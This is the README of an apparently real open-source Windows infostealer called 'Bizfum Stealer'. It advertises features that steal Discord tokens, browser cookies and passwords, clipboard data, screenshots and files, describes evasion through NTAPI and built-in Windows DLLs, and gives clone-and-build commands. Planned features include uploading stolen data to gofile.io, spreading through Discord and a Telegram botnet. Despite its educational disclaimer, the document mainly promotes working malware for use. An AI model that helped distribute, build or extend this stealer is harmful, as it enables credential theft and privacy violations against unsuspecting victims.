<h1 align="center"><i>Bizfum Stealer</i></h1>
<p align="center">
  <img src="https://github.com/user-attachments/assets/a9c78382-5178-4510-9dc3-f005926164da" alt="BIZFUM">
</p>

<p align="center">
  <strong>Bizfum Stealer</strong> is a 2024-developed open source stealer malware. It performs common data exfiltration tasks while leveraging pre-installed Windows DLLs and utilizing NTAPI for WinAPI calls, minimizing suspicion. This repository will be updated in the near future. Stars would greatly support this project!
</p>


## Table of Contents
- [Installation](#installation)
- [Purpose of the Project](#purpose)
- [Current Features](#current-features)
- [Coming Features](#coming-features)
- [DLLs the Stealer Takes Advantage of](#dlls-the-stealer-takes-advantage-of)
- [Repository Structure](#repository-structure)
- [Disclaimer](#disclaimer)

## Installation
The installation process is straightforward. Clone the repository and choose the desired version, as indicated in the repository structure. For instance, to install the version with debug information:

**Linux**
```bash
git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer/debug-version && chmod +x build.sh && ./build.sh
```

**CMD / POWERSHELL**
```powershell
git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git; cd Bizfum-Stealer; Start-Process "build.bat"
```
```cmd
git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer && .\build.bat
```

## Purpose
With years of experience in web hacking, I ventured into malware development to explore a second facet of the hacking landscape. Bizfum Stealer serves as a proof-of-concept (PoC) and is not intended for malicious activities. While it may not be fully undetectable (FUD), creating a loader could enhance its stealth capabilities. However, I am really sure, if I shared my UD loader, it would lead into unethical uses.

My personal interest in this project stems from the lack of open-source C-based stealers on GitHub. Most available options are either outdated or poorly maintained. While languages like C++ and C# are more prevalent, I believe C remains a powerful choice for this type of development.

## Current Features
- Utilizes NtAPI to reduce the likelihood of detection.
- Dynamically loading pre-installed Dynamic Link Libraries of Windows.
- Captures screenshots and saves them as bitmap files.
- Extracts pictures and files based on specific names or extensions.
- Steals clipboard data.
- Captures Discord tokens.
- Stealing of Chrome and Firefox cookies + passwords.
- Zipping of stolen data -> AES Encryption of ZIP file -> RSA Encryption of AES Encryption Key.

## Coming Features
- Other browser theft.
- Self-propagation through applications such as Discord.
- Uses `winhttp.dll` to upload stolen data to gofile.io via their API.
- Extraction of game tokens or credentials.
- Potential development of a Telegram-based botnet without requiring constant connectivity or request spamming.

## DLLs the Stealer Takes Advantage of
- C:\Program Files\Mozilla Firefox\nss3.dll ( If Firefox is installed )
- C:\Windows\System32\winsqlite3.dll
- C:\Windows\System32\crypt32.dll
- C:\Windows\System32\bcrypt.dll
- C:\Windows\System32\ole32.dll
- C:\Windows\System32\ntdll.dll
- C:\Windows\System32\gdi32.dll

## Repository Structure
The repository includes both DLL and EXE versions of the malware. This allows for use of for example a *Reflective DLL Loader*. Both versions have been tested on Windows 10 and Windows 11.

Additionally, a version with debug information is available that does not connect anywhere. The version without debug information will send data and function correctly if set up properly.

## Disclaimer
This software is intended for educational and research purposes only. The author does not condone or support any illegal or unethical use of this software. Use this tool responsibly and within the boundaries of the law. The author is not liable for any misuse or consequences resulting from the use of this software.

## Update Log
V0.1 - 19th of September - Project started.

V0.2 - 26th of September - Added Firefox and Chrome (cookie / password) (decryption / stealing).

V0.3 - 3rd of October    - Added Zipping of stolen data && AES Encryption of ZIP file && RSA Encryption of AES Key && Base64 Encoding of RSA encrypted AES Key

## Known Issues
- SQLite function calls act in a unexpected way for 64-bit os.

